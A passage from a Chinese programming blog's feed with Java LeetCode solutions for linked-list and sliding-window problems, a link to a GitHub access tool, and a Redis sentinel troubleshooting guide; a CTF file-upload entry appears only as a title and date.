1：</span><br><span class="line">输入：lists = [[1,4,5],[1,3,4],[2,6]]</span><br><span class="line">输出：[1,1,2,3,4,4,5,6]</span><br><span class="line">解释：链表数组如下：</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">将它们合并到一个有序链表中得到。</span><br><span class="line">1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：lists = []</span><br><span class="line">输出：[]</span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：lists = [[]]</span><br><span class="line">输出：[] </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">k == lists.length</span><br><span class="line">0 &lt;= k &lt;= 10^4</span><br><span class="line">0 &lt;= lists[i].length &lt;= 500</span><br><span class="line">-10^4 &lt;= lists[i][j] &lt;= 10^4</span><br><span class="line">lists[i] 按 升序 排列</span><br><span class="line">lists[i].length 的总和不超过 10^4</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol><li>我们想要一个从小到大的升序链表，即每次循环都取出一个最小的节点，然后依次连接，则得到一个升序的链表。</li><li>难点在于如何在 <code>K</code> 个链表中拿到一个最小的节点。</li><li>运用优先队列-小根堆的思想，堆顶得到的永远是最小值。我们可以先遍历所有链表，把每个链表的头结点入堆，即可得到第一个最小的节点（堆顶），然后取出最小节点的下一节点入堆排序，循环取出堆顶，依次连接即可得到一条升序链表。</li></ol><p>技术栈：</p><ol><li>优先队列 <code>PriorityQueue&lt;ListNode&gt; pq = new PriorityQueue&lt;&gt;(length, (a, b) -&gt; (a.val - b.val));</code> , 小根堆就设置 <code>a.val - b.val</code></li><li>加入队列 <code>pq.add(node)</code></li><li>堆顶出列 <code>pq.poll()</code></li><li>判断堆是否为空 <code>pq.isEmpty()</code></li></ol><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p = dummy;</span><br><span class="line">        <span class="comment">// 运用优先队列-小根堆的思想，根节点始终保持最小值</span></span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(lists.length, (a,b) -&gt; (a.val - b.val));</span><br><span class="line">        <span class="comment">// 因为链表数组已经排序，先将链表数组内的头节点全部存入小根堆中</span></span><br><span class="line">        <span class="keyword">for</span>(ListNode head:lists) &#123;</span><br><span class="line">            <span class="comment">// 如果链表非空，则入堆</span></span><br><span class="line">            <span class="keyword">if</span>(head != <span class="literal">null</span>) pq.add(head);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环将链表的节点入堆，然后每次取出堆顶节点，则得到升序链表</span></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 堆顶出列</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">minNode</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            p.next = minNode;</span><br><span class="line">            <span class="comment">// 如果堆顶节点还有后续节点，则入堆排序</span></span><br><span class="line">            <span class="keyword">if</span> (minNode.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(minNode.next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// p 往下走</span></span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;困难等级。&lt;/p&gt;
&lt;p&gt;给你一个链表数组，每个链表都已经按升序排列。&lt;br&gt;请你将所有链表合并到一个升序链表中，返回合并后的链表。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="堆" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E5%A0%86/"/>
    
    
    <category term="二叉堆" scheme="https://blog.zhengxiangling.com/tags/%E4%BA%8C%E5%8F%89%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>No.86 分割链表</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/</id>
    <published>2023-10-11T01:45:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>中等题目。</p><p>给你一个链表的头节点 <code>head</code> 和一个特定值 <code>x</code> ，请你对链表进行分隔，使得所有 <strong>小于</strong> <code>x</code> 的节点都出现在 <strong>大于或等于</strong> <code>x</code> 的节点之前。</p><p>你应当 <strong>保留</strong> 两个分区中每个节点的初始相对位置。</p><span id="more"></span><p> 示例 1：<br><img src="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,4,3,2,5,2], x = 3</span><br><span class="line">输出：[1,2,2,4,3,5]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：head = [2,1], x = 2</span><br><span class="line">输出：[1,2]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">链表中节点的数目在范围 [0, 200] 内</span><br><span class="line">-100 &lt;= Node.val &lt;= 100</span><br><span class="line">-200 &lt;= x &lt;= 200</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>本题为单链表，关键点为<code>虚拟头节点</code>和<code>断开原链表节点的next指针防止成环</code>。新建两条链表，把小于<code>x</code>的节点放在链表1，大于等于<code>x</code>的放在链表2，然后合并链表。</p><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">partition</span><span class="params">(ListNode head, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">      <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), dummy2 = <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p1 = dummy1, p2 = dummy2;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt; x) &#123;</span><br><span class="line">                p1.next = p;</span><br><span class="line">                p1 = p1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2.next = p;</span><br><span class="line">                p2 = p2.next;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 断开链</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> p.next;</span><br><span class="line">            p.next = <span class="literal">null</span>;</span><br><span class="line">            p = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p1.next = dummy2.next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy1.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;中等题目。&lt;/p&gt;
&lt;p&gt;给你一个链表的头节点 &lt;code&gt;head&lt;/code&gt; 和一个特定值 &lt;code&gt;x&lt;/code&gt; ，请你对链表进行分隔，使得所有 &lt;strong&gt;小于&lt;/strong&gt; &lt;code&gt;x&lt;/code&gt; 的节点都出现在 &lt;strong&gt;大于或等于&lt;/strong&gt; &lt;code&gt;x&lt;/code&gt; 的节点之前。&lt;/p&gt;
&lt;p&gt;你应当 &lt;strong&gt;保留&lt;/strong&gt; 两个分区中每个节点的初始相对位置。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    
    <category term="单链表" scheme="https://blog.zhengxiangling.com/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>github稳定访问工具</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/</id>
    <published>2023-10-11T01:35:00.000Z</published>
    <updated>2023-11-17T14:27:30.004Z</updated>
    
    <content type="html"><![CDATA[<p>目前在用稳定工具，<a href="https://gitee.com/XingYuan55/FastGithub/releases/tag/2.1.4">FastGithub</a></p><p><a href="https://github.com/dotnetcore/FastGithub">源地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目前在用稳定工具，&lt;a href=&quot;https://gitee.com/XingYuan55/FastGithub/releases/tag/2.1.4&quot;&gt;FastGithub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/dotnetcor</summary>
      
    
    
    
    <category term="分享" scheme="https://blog.zhengxiangling.com/categories/%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>No.3 无重复字符的最长字串</title>
    <link href="https://blog.zhengxiangling.com/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/"/>
    <id>https://blog.zhengxiangling.com/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/</id>
    <published>2023-10-10T02:04:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>中等题目</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 最长子串 的长度。</p><span id="more"></span><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br><span class="line"></span><br><span class="line">示例 3:</span><br><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">    请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">0 &lt;= s.length &lt;= 5 * 10^4 </span><br><span class="line">s 由英文字母、数字、符号和空格组成</span><br></pre></td></tr></table></figure><h5 id="最开始解法"><a href="#最开始解法" class="headerlink" title="最开始解法"></a>最开始解法</h5><p>初步判断为滑动窗口，记录最长字串和最长长度，然后不断右移和缩动窗口</p><p>技术栈：<br>字符串分割 <code>String.substring(prev, last)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">subs</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">findIndex</span> <span class="operator">=</span> subs.indexOf(String.valueOf(c));</span><br><span class="line">            <span class="keyword">if</span> (findIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                subs += c;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">                subs = subs.substring(findIndex + <span class="number">1</span>, subs.length()) + c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 12ms</p><h5 id="使用滑动窗口框架解法"><a href="#使用滑动窗口框架解法" class="headerlink" title="使用滑动窗口框架解法"></a>使用滑动窗口框架解法</h5><p>使用hash记录字符出现次数，出现重复字符则滑动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">            right++;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (window.get(c) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">lc</span> <span class="operator">=</span> s.charAt(left); </span><br><span class="line">                left ++;</span><br><span class="line">                window.put(lc, window.get(lc) -<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ans = Math.max(ans, right - left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 6ms</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;中等题目&lt;/p&gt;
&lt;p&gt;给定一个字符串 &lt;code&gt;s&lt;/code&gt; ，请你找出其中不含有重复字符的 最长子串 的长度。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>redis哨兵模式启动和异常排查</title>
    <link href="https://blog.zhengxiangling.com/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/"/>
    <id>https://blog.zhengxiangling.com/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/</id>
    <published>2023-02-13T07:34:00.000Z</published>
    <updated>2023-11-17T14:27:30.006Z</updated>
    
    <content type="html"><![CDATA[<p>当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。</p><span id="more"></span><h2 id="常用涉及redis哨兵模式的命令"><a href="#常用涉及redis哨兵模式的命令" class="headerlink" title="常用涉及redis哨兵模式的命令"></a>常用涉及redis哨兵模式的命令</h2><h3 id="1-查看哨兵模式状态"><a href="#1-查看哨兵模式状态" class="headerlink" title="1.查看哨兵模式状态"></a>1.查看哨兵模式状态</h3><p>假设系统集群中的三台服务器为 x.x.60.11、x.x.60.12、x.x.60.13,其中60.12为集群主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>查看哨兵模式状态的<code>别名</code>是否正确，状态（<code>status</code>）是否<code>ok</code>，<code>address</code>是否指向<code>x.x.60.12</code>，如果都正常则无异常。</p><h3 id="2-查看进程中-redis-的服务"><a href="#2-查看进程中-redis-的服务" class="headerlink" title="2.查看进程中 redis 的服务"></a>2.查看进程中 redis 的服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure><p>正常情况下会存在两个进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UID       PID       PPID      C     STIME    TTY       TIME         CMD</span><br><span class="line">zheng     6788      0         0     00:00    pts/0      00:00:00     redis-server</span><br><span class="line">zheng     6789      0         0     00:00    pts/0      00:00:00     redis-sentinel</span><br></pre></td></tr></table></figure><h3 id="3-关闭哨兵模式服务"><a href="#3-关闭哨兵模式服务" class="headerlink" title="3.关闭哨兵模式服务"></a>3.关闭哨兵模式服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 6788 6789 <span class="comment">#上述的进程号</span></span><br></pre></td></tr></table></figure><h3 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4.启动服务"></a>4.启动服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-server redis.conf</span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><h2 id="排查-redis-哨兵模式异常情况"><a href="#排查-redis-哨兵模式异常情况" class="headerlink" title="排查 redis 哨兵模式异常情况"></a>排查 redis 哨兵模式异常情况</h2><h3 id="1-检查哨兵模式状态"><a href="#1-检查哨兵模式状态" class="headerlink" title="1.检查哨兵模式状态"></a>1.检查哨兵模式状态</h3><p>ps：ip 地址分别更改为三台服务器的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>如果某台服务器<code>status</code>为<code>odown</code>，或者<code>address</code>指向不为<code>x.x.60.12</code>,则说明集群出现问题，需要重启集群。</p><h3 id="2-检查哨兵模式配置文件是否正常"><a href="#2-检查哨兵模式配置文件是否正常" class="headerlink" title="2.检查哨兵模式配置文件是否正常"></a>2.检查哨兵模式配置文件是否正常</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看每台服务器的 sentinel.conf 配置文件</span></span><br><span class="line">vi sentinel.conf</span><br></pre></td></tr></table></figure><p>查看 <code>sentinel monitor redismaster &quot;ip地址&quot; 6379 0</code>,检查 ip 地址是否为主机地址，如果不为该值则说明<code>sentinel</code> 有误，<strong>在 <code>redis</code> 的服务都暂时的情况下再修改配置文件，修改该ip地址为主机地址，然后保存</strong>。</p><h3 id="排查完如上问题，重启服务"><a href="#排查完如上问题，重启服务" class="headerlink" title="排查完如上问题，重启服务"></a>排查完如上问题，重启服务</h3><p>启动顺序，** 优先启动主机的服务 **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 redis</span></span><br><span class="line">./redis-server redis.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>redis</code></p><p>然后再启动哨兵模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 sentinel</span></span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>sentinel</code></p><h3 id="查询状态"><a href="#查询状态" class="headerlink" title="查询状态"></a>查询状态</h3><p>在三台服务器中输入 <code>ps -ef | grep redis</code>，如果存在两个 <code>redis</code> 进程则说明应用启动正常。<br>然后分别在三台服务器输入 <code>./redis-cli -h 当前服务器ip地址 -p 26379 INFO</code>，如果别名、状态、指向地址都正确，则说明哨兵模式正常。</p><p>然后可以通过应用验证 <code>redis</code> 是否恢复完毕。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。&lt;/p&gt;</summary>
    
    
    
    <category term="服务器" scheme="https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    <category term="爬坑" scheme="https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E7%88%AC%E5%9D%91/"/>
    
    
    <category term="redis" scheme="https://blog.zhengxiangling.com/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>CTF - 文件上传</title>
    <link href="https://blog.zhengxiangling.com/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://blog.zhengxiangling.com/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-07-21T01:21:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
